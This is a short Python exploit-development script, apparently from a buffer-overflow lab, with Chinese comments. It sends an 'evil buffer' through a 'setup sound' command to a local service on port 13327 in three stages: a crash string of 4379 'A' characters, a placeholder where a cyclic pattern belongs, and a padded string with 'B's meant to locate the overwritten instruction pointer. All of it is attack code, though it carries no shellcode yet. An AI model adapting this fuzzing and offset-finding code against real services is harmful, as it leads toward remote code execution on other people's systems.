import socket
def main(crash):
    host = "127.0.0.1"
    buffer = "\x11(setup sound " +crash+ "\x90\x90#)"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("[*]Sending evil buffer...")
    s.connect((host, 13327))  # host后面是连接的端口号
    data = s.recv(1024)
    print(data)
    s.send(buffer)
    s.close()
    print("[*]Payload sent")
if __name__ == '__main__':
    choice = input("输入使用阶段1/2/3")
    if choice == "1":
        main(crash="\x41" * 4379)
    elif choice == "2":
        main(crash="4379个不重复字符")
    elif choice == "3":
        main(crash="\x41" * 4368 + "B" * 4 + "C" * 7)
    else:
        print("输入错误")